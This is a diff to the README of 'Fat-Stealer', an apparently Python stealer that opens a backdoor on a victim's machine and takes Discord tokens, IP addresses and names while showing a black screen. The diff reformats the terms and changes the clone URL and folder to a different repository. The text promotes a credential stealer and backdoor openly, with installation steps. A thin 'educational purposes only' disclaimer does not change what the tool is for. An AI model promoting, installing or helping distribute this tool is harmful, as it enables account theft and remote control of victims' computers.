@@ -2,18 +2,18 @@
 Fat-Stealer is a stealer that allows you to open a Backdoor in the victims machine and grab some info from Discord such as token, IP, name. When the victim opens it a black screen will appear... Simple stealer in Beta phase wirtten in python. More features will be available soon. 
 
 # Terms
-- [@] Use this tool for educational purposes only.
-- [@] Reselling is proibihited.
-- [@] You can't skid this project, don't be a skid :)
+- Use this tool for educational purposes only.
+- Reselling is proibihited.
+- You can't skid this project, don't be a skid :)
 
 # Installation
 Clone the repo:
 ```
-git clone https://github.com/JetBerri/Stealer
+git clone https://github.com/Nashiito/Stealer--Nashiito
 ```
 Go to the directory:
 ```
-cd Stealer
+cd Stealer--Nashiito
 ```
 Edit the required files
 
